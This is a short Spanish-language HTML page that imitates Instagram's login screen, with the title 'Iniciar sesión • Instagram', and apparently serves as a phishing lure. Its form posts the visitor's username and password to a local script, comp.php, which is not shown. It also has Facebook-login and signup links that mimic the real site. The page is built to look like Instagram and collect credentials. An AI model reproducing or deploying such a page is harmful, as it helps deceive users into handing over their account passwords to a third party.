<html>
<head>
  <link rel="icon" href="imagenes/icono.png">
  <title>Iniciar sesión • Instagram</title>
</head>
<link href="estilos.css" rel="stylesheet">
<body class="fondo">
<center>
  <div class="cajalogin">
    <img src="imagenes/presiogram.png" alt="">
    <div class="estiloinput">
      <form action="comp.php" method="post">
      <p><input class="input" type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" /></p>
      <p><input class="input" type="password" name="password" placeholder="Contraseña" /></p>
      <button class="boton Fuente btn btn-primary" type="submit" action="comp.php">Iniciar sesion </button>
      </form>
    </div>
    <img src="imagenes/barra.png" alt="">
    <div>
    <img src="imagenes/fb.png" alt="" class="fb"> <a href="login.php" class="letras" style="color:#3897f0;">Iniciar sesion con facebook</a>
    </div>
  </div>
  <div class="cajalogin" style="height:27px;">
    ¿No tienes cuenta?<a href="inicio.php" class="minia" style="color:#3897f0;"> Registrate</a>
  </div>
</center>
</html>
